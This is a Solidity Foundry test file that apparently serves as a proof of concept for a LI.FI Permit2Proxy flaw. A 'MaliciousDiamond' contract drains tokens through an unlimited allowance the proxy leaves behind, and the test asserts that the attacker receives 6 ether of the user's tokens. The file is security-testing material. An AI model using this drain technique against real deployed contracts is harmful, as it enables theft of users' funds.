// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.17;

import "forge-std/Test.sol";
import { Permit2Proxy } from "lifi/Periphery/Permit2Proxy.sol";
import { ISignatureTransfer } from "permit2/interfaces/ISignatureTransfer.sol";
import { TestToken } from "../utils/TestToken.sol";
import { IERC20 } from "@openzeppelin/contracts/token/ERC20/IERC20.sol";

contract MaliciousDiamond {
    function dummy() external {}

    function drain(
        address token,
        address from,
        address to,
        uint256 amount
    ) external {
        IERC20(token).transferFrom(from, to, amount);
    }
}

contract Permit2ProxyAllowanceTest is Test {
    Permit2Proxy private proxy;
    TestToken private token;
    MaliciousDiamond private diamond;
    address private user = address(0x1);
    address private attacker = address(this);

    function setUp() public {
        diamond = new MaliciousDiamond();
        token = new TestToken("Token", "TKN", 18);
        proxy = new Permit2Proxy(
            address(diamond),
            ISignatureTransfer(address(0)),
            attacker
        );

        token.mint(user, 10 ether);
        vm.prank(user);
        token.approve(address(proxy), 1 ether);
    }

    function test_UnlimitedAllowanceAllowsDiamondToDrainTokens() public {
        bytes memory dummyData = abi.encodeWithSelector(MaliciousDiamond.dummy.selector);

        vm.prank(user);
        proxy.callDiamondWithEIP2612Signature(
            address(token),
            1 ether,
            block.timestamp,
            0,
            0,
            0,
            dummyData
        );

        vm.prank(user);
        token.transfer(address(proxy), 5 ether);

        diamond.drain(address(token), address(proxy), attacker, 6 ether);

        assertEq(token.balanceOf(address(proxy)), 0);
        assertEq(token.balanceOf(attacker), 6 ether);
    }
}

